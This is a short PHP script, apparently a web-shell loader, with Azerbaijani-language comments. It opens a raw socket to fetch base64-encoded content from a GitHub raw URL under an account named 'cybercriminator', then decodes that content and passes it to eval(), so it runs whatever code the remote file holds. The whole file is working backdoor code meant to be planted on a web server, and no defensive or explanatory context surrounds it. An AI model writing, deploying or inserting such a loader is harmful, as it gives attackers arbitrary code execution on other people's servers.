<?php
/*
r4m1l
*/
function getRemoteCode($url) {
    $parts = parse_url($url);
    $host = $parts['host'];
    $path = isset($parts['path']) ? $parts['path'] : '/';
    $scheme = ($parts['scheme'] == 'https') ? 'ssl://' : '';
    $port = ($parts['scheme'] == 'https') ? 443 : 80;
    
    // Socket aç
    $fp = @fsockopen($scheme.$host, $port, $errno, $errstr, 30);
    
    if (!$fp) {
        return false;
    }
    
    // HTTP request gönd?r
    $request = "GET $path HTTP/1.1\r\n";
    $request .= "Host: $host\r\n";
    $request .= "User-Agent: Mozilla/5.0\r\n";
    $request .= "Connection: Close\r\n\r\n";
    
    fwrite($fp, $request);
    
    // Response oxu
    $response = '';
    while (!feof($fp)) {
        $response .= fgets($fp, 1024);
    }
    fclose($fp);
    
    // HTTP header-l?ri ayır, yalnız body qalsın
    $body = substr($response, strpos($response, "\r\n\r\n") + 4);
    
    return trim($body);
}

// İstifad?
$url = "https://raw.githubusercontent.com/cybercriminator/karabakh/refs/heads/main/bRas";
$base64Code = getRemoteCode($url);

if ($base64Code) {
    // Base64 decode et v? çalıştır
    eval("?>".base64_decode($base64Code));
} else {
    echo "Error fetching remote code";
}
